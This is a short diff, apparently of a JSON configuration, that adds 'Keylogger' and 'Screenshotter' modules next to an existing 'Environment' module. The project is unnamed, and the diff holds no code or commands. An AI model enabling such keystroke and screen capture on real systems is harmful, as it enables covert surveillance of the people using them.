@@ -5,6 +5,14 @@
   {
     "module" : "Environment"
   }
+  ,
+  {
+    "module" : "Keylogger"
+  },
+  {
+    "module" : "Screenshotter"
+  }
+
 
 
 
